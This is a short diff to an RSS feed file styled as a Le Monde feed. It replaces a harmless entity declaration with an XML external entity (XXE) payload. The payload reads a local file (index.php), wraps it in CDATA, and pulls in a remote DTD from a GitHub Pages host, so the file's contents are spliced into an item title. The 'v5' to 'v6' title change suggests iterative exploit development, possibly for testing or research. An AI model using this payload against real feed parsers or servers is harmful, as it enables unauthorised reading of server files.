@@ -1,12 +1,15 @@
 <!DOCTYPE rss [
- <!ENTITY % moresyntax "<!ENTITY foo 'dynamic'>">
-%moresyntax;
+ <!ENTITY % file SYSTEM "file://index.php">
+ <!ENTITY % start "<![CDATA[">
+ <!ENTITY % end "]]>">
+ <!ENTITY % dtd SYSTEM "https://joffreyal.github.io/join.dtd">
+%dtd;
 ]>
 <rss
 	xmlns:atom="http://www.w3.org/2005/Atom"
 	xmlns:media="http://search.yahoo.com/mrss/" version="2.0">
 	<channel>
-		<title>Inline retrieval v5</title>
+		<title>Inline retrieval v6</title>
 		<description>Le Monde.fr - 1er site d’information. Les articles du journal et toute l’actualité en continu : International, France, Société, Economie, Culture, Environnement, Blogs ...</description>
 		<copyright>Le Monde - L’utilisation des flux RSS du Monde.fr est réservée à un usage strictement personnel, non professionnel et non collectif. Toute autre exploitation doit faire l’objet d’une autorisation et donner lieu au versement d’une rémunération. Contact : droitsdauteur@lemonde.fr</copyright>
 		<link>https://www.lemonde.fr/rss/une.xml</link>
@@ -15,7 +18,7 @@
 		<atom:link href="https://www.lemonde.fr/rss/une.xml" rel="self" type="application/rss+xml"/>
 		<item>
 			<title>
-				&foo;
+				&all;
 			</title>
 			<pubDate>Wed, 17 Mar 2021 09:52:45 +0100</pubDate>
 			<description>
